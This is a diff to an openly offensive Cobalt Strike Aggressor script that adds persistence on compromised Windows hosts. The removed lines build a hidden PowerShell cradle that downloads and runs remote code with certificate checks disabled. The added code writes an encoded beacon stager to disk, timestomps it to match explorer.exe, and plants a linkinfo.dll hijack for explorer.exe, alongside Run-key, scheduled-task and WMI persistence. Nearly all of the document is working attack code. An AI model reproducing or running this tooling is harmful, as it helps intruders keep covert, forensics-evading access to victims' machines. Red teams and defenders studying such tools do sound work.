@@ -1,11 +1,17 @@
+# Added linkinfo.dll hijack
+# Added persistence via encoded powershell commands
+# To do: Check if this is a 64bit system and alert that file and registry changes may end up in SYSWOW64
+#        Add fileless persistence via registry only
+
 ##################################
-### Aggressor Persistence v3.0 ###
+### Aggressor Persistence v3.1 ###
 ###     By: Tyler Rosonke      ###
 ###        zonksec.com         ###
 ##################################
 
+global('$x64');
+
 alias persistence {
-    if (checkPSpayload($1)){
 
 ########### Add Menu #############
         if ($2 eq "Add"){
@@ -40,10 +46,14 @@ alias persistence {
                     berror($1, "Specifiy OnStart or Daily.");
                 }
             }
+            else if ($3 eq "linkinfo") {
+                addLinkinfo($1);
+            }
             else {
-                berror($1, "Specify RegKeyRun, SchTasks, or WMI.");
+                berror($1, "Specify RegKeyRun, SchTasks, WMI, or linkinfo.");
             }
         }
+
 ########### Remove Menu #############
         else if ($2 eq "Remove"){
             if ($3 eq "RegKeyRun") {
@@ -81,46 +91,66 @@ alias persistence {
                 berror($1, "Specify RegKeyRun, SchTasks, or WMI.");
             }
         }
+        else if ($3 eq "linkinfo") {
+                remLinkinfo($1);
+        }
         else {
             berror($1, "Specify Add or Remove.");
         }
-    }
-    else {
-        berror($1, "Need PowerShell Web Delivery to add persistence.");
-    }
-
 }
 
 ########### Subroutines #############
-sub checkPSpayload{
-    foreach $site (sites()) {
-        # Site description was updated in CS 3.X from "PowerShell Web Delivery" to "Scripted Web Delivery (powershell)"
-       if ($site['Description'] eq "Scripted Web Delivery (powershell)"){
-           return true;
-       }
+
+sub checkX64 {
+    if ($1 -is64) {
+        binput($1, "You're on a 64bit host! Make sure you're running in a 64bit process or file and registry changes may end up in SYSWOW locations and fail to function as intended!");
+        return true;
     }
-}  
+    else {
+        return false;
+    }
+}
+
 sub uploadPSpayload {
-    foreach $site (sites()) {
-       if ($site['Description'] eq "Scripted Web Delivery (powershell)"){
-            if ($site['Port'] eq '443' ){
-                binput($1, "[*] Using HTTPS Powershell Stager");
-                # Modified to allow staging over HTTPs if a self-signed cert is used
-                # Add HTTPS over HTTP
-                $downloadstring = "https://" . $site['Host'] . ":" . $site['Port'] . $site['URI'];
-                # Disable certficate validation checking
-                $data = 'powershell.exe -nop -w hidden -c "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};'; 
-                $data = $data . "IEX ((new-object net.webclient).downloadstring(\'" . $downloadstring . "\'))\"";
-            }
-            else {
-                $downloadstring = "http://" . $site['Host'] . ":" . $site['Port'] . $site['URI'];
-                $data = "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring(\'" . $downloadstring . "\'))\"";
-            }
-            binput($1, "[*] Attempting to upload persistence file: $2");
-            bupload_raw($1, $2, $data);
-            btimestomp($1,$2,'C:\Windows\explorer.exe')
-       }
+    # Improved robustness in cases where you have more than one listener configured (foreign listeners)
+    # Additionally, this method leverages an encoded command rather than staging via the Powershell download IEX cradle
+    
+    $availableListeners = listeners();
+
+    # Skip listener selection if only 1 exists
+    if (size($availableListeners()) eq 1) {
+        $listener = $availableListeners[0];
+        binput($1, "Persisting listener: $listener");
+        $data = "@echo off\r\n";
+        $data = $data . powershell($listener, false);
+        binput($1, "Attempting to upload persistence file: $2");
+        bupload_raw($1, $2, $data);
+        binput($1, "timestomp $2 explorer.exe");
+        btimestomp($1, $2,'C:\Windows\explorer.exe');
     }
+
+    # There is likely a better way to select a listener, but this is the quickest method I came up with without modifying the logic of every function to require a listener_name
+    # Use payload helper function if more than one listener is available
+    else {
+        # Store the payloadPath as global variable so it can be accessed by the callback function of &openPayloadHelper
+        # If you include instructions contingent on the completion of the openPayloadHelper function outside of its callback function,
+        #  those instructions will execute as soon as the payload selection dialog opens and they will fail. This is why some code repeats
+        
+        global ('$gpayloadPath');
+        $gpayloadPath = $2;
+        openPayloadHelper(lambda({
+            $listener = $1;
+            binput($bids, "Persisting listener: $listener");
+            $data = "@echo off\r\n";
+            $data = $data . powershell($listener, false);
+            binput($bids, "Attempting to upload persistence file: $gpayloadPath");
+            
+            bupload_raw($bids, $gpayloadPath, $data);
+            binput($bids, "timestomp $gpayloadPath explorer.exe");
+            btimestomp($bids, $gpayloadPath,'C:\Windows\explorer.exe');
+        }, $bids => $1));
+    }
+ 
 }
 sub isAdmin {
     return iff( right(beacon_info($1, "user"), 2) eq " *" , true, false);
@@ -153,8 +183,8 @@ sub addRegKeyRun {
         $hive = "HKCU";
     }
     $keyPath = "\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\";
-    uploadPSpayload($1,$payloadPath);
     addRegKey($1,$hive,$keyPath,$keyName,$payloadPath);
+    uploadPSpayload($1,$payloadPath);
 }
 sub remRegKeyRun {
     if ($4) {
@@ -475,6 +505,37 @@ sub remWMIDaily {
     }
 }
 
+sub addLinkinfo {
+    # dll hijack on explorer.exe
+    if (isAdmin($1)) {
+        if (-exists script_resource("/payloads/linkinfo.dll")) {
+            binput($1, "[*] Dropping linkinfo.dll persistence");
+            bcd($1, 'c:\windows');
+            bupload($1, script_resource("/payloads/linkinfo.dll"));
+            btimestomp($1, "linkinfo.dll", 'c:\windows\system32\linkinfo.dll');
+        }
+        else {
+            berror($1, "./payloads/linkinfo.dll not found. Make sure you've created a DLL that matches the target architecture and stored it as ./payloads/linkinfo.dll");
+        }
+    }
+    else {
+        berror($1, 'Admin or write-access to C:\Windows is needed for linkinfo.dll hijack');
+    }
+}
+
+sub remLinkinfo {
+    # Remove dll hijack on explorer.exe
+    if (isAdmin($1)) {
+        binput($1, "[*] Removing linkinfo.dll persistence");
+        bcd($1, 'c:\windows');
+        $command = "del linkinfo.dll";
+        bshell($1,$command);
+    }
+    else {
+        berror($1, 'Admin or write-access to C:\Windows is needed for linkinfo.dll hijack removal');
+    }
+}
+
 ##### Help Menu ######
 beacon_command_register(
     "persistence", 
@@ -491,8 +552,10 @@ Available methods:
     *SchTasks OnLogon <payload / task name>
     *WMI OnStart <payload / task name>
     *WMI Daily <payload / task name>
+    **linkinfo
 
  * = method needs admin
+** = method need admin to install, but executes as USER
 [] = requireed argument
 <> = optional argument
 ");
